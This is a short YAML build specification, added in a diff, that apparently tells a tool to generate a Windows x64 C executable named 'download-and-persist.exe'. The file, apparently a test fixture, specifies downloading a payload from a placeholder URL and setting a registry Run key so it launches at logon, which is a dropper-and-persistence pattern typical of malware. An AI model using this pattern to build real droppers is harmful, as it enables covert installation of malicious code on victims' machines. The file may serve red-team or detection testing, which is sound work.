@@ -1,0 +1,14 @@
+outfile: ../output/download-and-persist.exe
+capabilities:
+  directory: ../capabilities
+  desired:
+  - downloadfile:
+      url: "https://example.com/payload.exe"
+      save_path: "C:\\\\Users\\\\Public\\\\payload.exe"
+  - regrunkey:
+      key_name: "AllcapsTestPersist"
+      command: "C:\\\\Users\\\\Public\\\\payload.exe"
+constraints:
+  language: c
+  format: exe
+  architecture: x64
